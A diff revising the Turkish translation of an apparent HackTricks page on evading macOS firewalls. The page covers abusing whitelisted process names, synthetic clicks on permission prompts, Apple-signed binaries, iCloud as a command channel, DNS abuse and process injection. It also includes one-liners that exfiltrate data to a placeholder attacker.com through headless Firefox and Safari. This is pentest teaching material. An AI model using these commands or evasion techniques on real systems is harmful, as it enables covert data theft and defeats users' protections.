@@ -1,53 +1,53 @@
-# macOS Güvenlik Duvarlarını Atlatma
+# macOS Güvenlik Duvarlarını Aşma
 
 {% hint style="success" %}
-AWS Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitimi AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitimi GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>HackTricks'i Destekleyin</summary>
 
-* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
-* **Hacking püf noktalarını paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
 {% endhint %}
 
-## Bulunan Teknikler
+## Bulunan teknikler
 
-Aşağıdaki teknikler bazı macOS güvenlik duvarı uygulamalarında çalışır bulunmuştur.
+Aşağıdaki teknikler bazı macOS güvenlik duvarı uygulamalarında çalışır durumda bulundu.
 
-### Beyaz liste adlarını kötüye kullanma
+### Beyaz liste isimlerini kötüye kullanma
 
-* Örneğin, zararlı yazılımı **`launchd`** gibi iyi bilinen macOS işlemleri adlarıyla çağırma
+* Örneğin, kötü amaçlı yazılımı **`launchd`** gibi iyi bilinen macOS süreçlerinin isimleriyle çağırmak.
 
 ### Sentetik Tıklama
 
-* Güvenlik duvarı kullanıcıdan izin istediğinde zararlı yazılımın **izin ver** düğmesine tıklamasını sağlama
+* Güvenlik duvarı kullanıcıdan izin istiyorsa, kötü amaçlı yazılımın **izin ver** butonuna tıklamasını sağlamak.
 
-### **Apple imzalı ikilileri Kullanma**
+### **Apple imzalı ikilileri kullanma**
 
-* **`curl`** gibi, ayrıca **`whois`** gibi diğerleri
+* **`curl`** gibi, ama ayrıca **`whois`** gibi diğerleri de.
 
-### İyi bilinen apple alan adları
+### İyi bilinen apple alanları
 
-Güvenlik duvarı, **`apple.com`** veya **`icloud.com`** gibi iyi bilinen apple alan adlarına bağlantılara izin veriyor olabilir. Ve iCloud bir C2 olarak kullanılabilir.
+Güvenlik duvarı, **`apple.com`** veya **`icloud.com`** gibi iyi bilinen apple alanlarına bağlantılara izin veriyor olabilir. Ve iCloud, bir C2 olarak kullanılabilir.
 
-### Genel Atlatma
+### Genel Bypass
 
-Güvenlik duvarlarını atlatmaya yönelik bazı fikirler
+Güvenlik duvarlarını aşmayı denemek için bazı fikirler.
 
 ### İzin verilen trafiği kontrol etme
 
-İzin verilen trafiği bilmek, potansiyel olarak beyaz listelenmiş alan adlarını veya bunlara erişime izin verilen uygulamaları belirlemenize yardımcı olacaktır
+İzin verilen trafiği bilmek, potansiyel olarak beyaz listeye alınmış alanları veya hangi uygulamaların onlara erişmesine izin verildiğini belirlemenize yardımcı olacaktır.
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
-### DNS Kötüye Kullanımı
+### DNS İstismar Etme
 
-DNS çözümlemeleri, muhtemelen DNS sunucularına erişime izin verilecek olan **`mdnsreponder`** imzalı uygulama aracılığıyla yapılır.
+DNS çözümlemeleri, muhtemelen DNS sunucularıyla iletişim kurmasına izin verilecek olan **`mdnsreponder`** imzalı uygulama aracılığıyla gerçekleştirilir.
 
 <figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
@@ -78,9 +78,9 @@ firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
-### İşlem enjeksiyonu aracılığıyla
+### Süreç enjeksiyonları aracılığıyla
 
-Eğer **bir işleme kod enjekte edebilirseniz** ve bu işlem herhangi bir sunucuya bağlanmaya izin veriliyorsa, güvenlik duvarı korumalarını atlayabilirsiniz:
+Eğer herhangi bir sunucuya bağlanmasına izin verilen bir **süreç içine kod enjekte edebilirseniz**, güvenlik duvarı korumalarını aşabilirsiniz:
 
 {% content-ref url="macos-proces-abuse/" %}
 [macos-proces-abuse](macos-proces-abuse/)
@@ -91,16 +91,16 @@ Eğer **bir işleme kod enjekte edebilirseniz** ve bu işlem herhangi bir sunucu
 * [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 
 {% hint style="success" %}
-AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitimi AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitimi GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>HackTricks'i Destekleyin</summary>
 
-* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
-* **Hacking püf noktalarını paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
 {% endhint %}
